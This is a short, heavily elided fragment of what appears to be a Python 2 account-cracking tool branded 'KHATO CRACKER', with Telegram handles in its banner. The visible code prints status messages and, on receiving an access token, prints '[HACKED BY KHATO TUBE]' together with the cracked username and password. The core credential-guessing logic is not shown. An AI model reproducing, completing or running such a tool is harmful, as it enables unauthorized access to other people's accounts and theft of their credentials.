...
&===========KHATO CRACKER  UP&&================
ME| KHATO
TLEGRAM CHANAL | @khatotube
ME TLEGRAM | @khatab_gh_tahir
Nrxe am toola 0$=
&=====================KHATO  UP&&======
 """
...
def action():
    ...
    time.sleep(0.1)
    psb('\x1b[1;92m[\xe2\x9c\x93]\x1b[1;92m Sabrt habe 10 daqa...')
    time.sleep(0.1)
    psb('[!] LO RAGRTNI TOOL CTRL+z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED BY KHATO TUBE]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
